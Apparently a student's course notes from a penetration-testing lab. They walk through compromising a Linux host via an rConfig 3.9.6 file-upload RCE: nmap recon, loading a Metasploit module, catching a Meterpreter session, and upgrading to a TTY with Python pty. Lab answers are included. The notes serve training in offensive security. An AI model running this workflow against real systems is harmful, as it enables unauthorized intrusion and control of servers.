# NOTE — Infiltrating Unix/Linux

## ID
407

## Module
Shells & Payloads

## Kind
notes

## Title
Section 10 — Infiltrating Unix/Linux

## Description
End-to-end Linux compromise via rConfig 3.9.6 vulnerability. Covers Nmap recon → version-fingerprinting an app → finding/loading a non-bundled MSF module from GitHub → exploit → TTY upgrade via Python pty.

## Tags
linux, rconfig, php, msf-module-loading, tty-upgrade, python-pty, jail-shell

## Commands
- `nmap -sC -sV <ip>` — service+script scan
- `locate exploits` — find MSF exploit dir on Pwnbox
- `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` — the manually-loaded module
- `python -c 'import pty; pty.spawn("/bin/sh")'` — upgrade to TTY shell
- `which python` — verify Python is present before pty trick

## What This Section Covers
~70% of websites run on Unix/Linux (W3Techs). Most paths to a Linux host go through a vulnerable web app, then often need a TTY upgrade because the initial foothold lands as the web user (e.g. `apache`/`www-data`) without a proper shell environment.

## Considerations Before Attacking a Linux Host
- What distribution? (CentOS, Ubuntu, Alpine, etc.)
- Which shells/programming languages are present?
- What's the system's role? (Web, DB, internal tool)
- Which app is hosted?
- Are there known CVEs?

## Walkthrough — rConfig 3.9.6 RCE
1. **Enumerate**: `nmap -sC -sV <ip>` — ports 80/443/3306/21/22, Apache 2.4.6 + PHP 7.2.34 on CentOS.
2. **Identify app**: Browse to IP → rConfig login page, version visible at bottom (3.9.6).
3. **Search**: `rConfig 3.9.6 vulnerability` → CVEs; `rConfig 3.9.6 exploit metasploit github` for MSF modules.
4. **Load non-bundled module** if needed: copy `.rb` from Rapid7 GitHub into `/usr/share/metasploit-framework/modules/exploits/linux/http/`.
5. **Run**:
   ```
   use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
   set RHOSTS / LHOST / SRVHOST
   exploit
   ```
6. **Receive Meterpreter** running as `apache`.
7. **Upgrade TTY** with Python pty (see below).

## MSF Module Loading — When Search Misses
MSF version may lack a module that exists in Rapid7's GitHub. Workflow:
```shell
locate exploits
# → /usr/share/metasploit-framework/modules/exploits/...
# wget or copy the .rb file into the matching subdirectory (e.g. linux/http/)
# All MSF modules are Ruby (.rb extension)
```
Or update: `apt update && apt install metasploit-framework`.

## Spawning a TTY with Python (Bourne Shell)
Initial web-app exploitation drops you as `apache` — a non-tty (jail) shell:
```shellsession
python -c 'import pty; pty.spawn("/bin/sh")'
sh-4.2$ whoami
apache
```
What it does:
- `import pty` — Python's pseudo-terminal module
- `pty.spawn("/bin/sh")` — fork a Bourne shell attached to a fresh pty
- Gives you a real prompt + ability to use `su`, `sudo`, `clear`, etc.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Language of the payload uploaded by `rconfig_vendors_auth_file_upload_rce` | **php** | Module output: `Uploading file 'xxx.php' containing the payload`. |
| Q2 — Hostname of the router in `/devicedetails` | (from `hostnameinfo.txt`) | After Meterpreter session: `cd /devicedetails; cat hostnameinfo.txt`. |

## Key Takeaways
- Login page footers often leak app version → search-engine straight to CVE/exploit.
- MSF GitHub > local install — drop missing modules into the matching exploit subfolder.
- Web-app exploits usually land you as the **web user**, not root — TTY upgrade is the first move after shell.
- Python's `pty.spawn` is the most portable upgrade trick on Linux.

## Gotchas
- File extension must be `.rb` for MSF to load the dropped module.
- Some modules need extra options (e.g. `SRVHOST`) that aren't in the basic `options` output — read the description.
- `pty.spawn` only works if Python is installed. Check with `which python` / `which python3` first; section 11 covers alternatives.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|shells-payloads]]
← [[09-infiltrating-windows]] | [[11-spawning-interactive-shells]] →
<!-- AUTO-LINKS-END -->
